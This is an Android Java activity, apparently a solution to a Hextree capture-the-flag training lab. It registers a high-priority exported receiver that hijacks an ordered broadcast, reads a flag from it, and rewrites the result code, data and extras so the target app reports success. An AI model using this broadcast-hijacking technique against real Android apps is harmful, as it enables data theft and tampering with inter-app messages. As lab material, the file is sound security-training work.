package com.example.practicapp;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityHextree extends AppCompatActivity {
    private int counting = 0;
    private Uri maliciousUri;

    BroadcastReceiver hijackReceiver;
    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);
        IntentFilter filter = new IntentFilter("io.hextree.broadcast.FREE_FLAG");

        // VERY IMPORTANT → high priority
        filter.setPriority(1000);

        hijackReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                Log.i("EXPLOIT", "Intercepted ordered broadcast!");

                // Extract flag
                String flag = intent.getStringExtra("flag");
                t1.setText(flag);
                Log.i("EXPLOIT", "Captured flag: " + flag);

                // 🔥 Core exploit
                setResultCode(1);   // this triggers success in target app

                // Optional modifications
                setResultData("owned");

                Bundle extras = new Bundle();
                extras.putString("msg", "hijacked");
                setResultExtras(extras);
            }
        };

        // Register receiver dynamically
        registerReceiver(hijackReceiver, filter, RECEIVER_EXPORTED);

        Log.i("EXPLOIT", "Receiver registered!");

    }
    @Override
    protected void onDestroy() {
        super.onDestroy();

        if (hijackReceiver != null) {
            unregisterReceiver(hijackReceiver);
        }
    }
}
